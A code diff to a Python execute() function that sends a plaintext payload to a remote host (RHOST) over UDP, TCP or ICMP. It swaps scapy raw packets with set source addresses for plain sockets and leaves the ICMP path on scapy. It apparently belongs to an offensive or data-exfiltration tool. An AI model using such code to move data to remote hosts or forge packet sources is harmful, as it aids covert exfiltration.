@@ -441,13 +441,29 @@ def execute(plaintext, params):
         payload = plaintext.encode()
 
     if (params["TRANSPORT"] == "UDP"):
-        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
-        scapy.UDP(sport=params["SPORT"], dport=params["RPORT"])/
-        payload, verbose=False)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((params["LHOST"], params["SPORT"]))
+        sock.connect((params["RHOST"], params["RPORT"]))
+
+        sock.send(payload)
+        sock.close()
+
+        # scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
+        # scapy.UDP(sport=params["SPORT"], dport=params["RPORT"])/
+        # payload, verbose=False)
     elif(params["TRANSPORT"] == "TCP"):
-        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
-        scapy.TCP(sport=params["SPORT"], dport=params["RPORT"], flags="AP")/
-        payload, verbose=False)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((params["LHOST"], params["SPORT"]))
+        sock.connect((params["RHOST"], params["RPORT"]))
+
+        sock.send(payload)
+        sock.close()
+
+        # scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
+        # scapy.TCP(sport=params["SPORT"], dport=params["RPORT"], flags="AP")/
+        # payload, verbose=False)
     elif(params["TRANSPORT"] == "ICMP"):
         scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
         scapy.ICMP(code=1, type=8)/
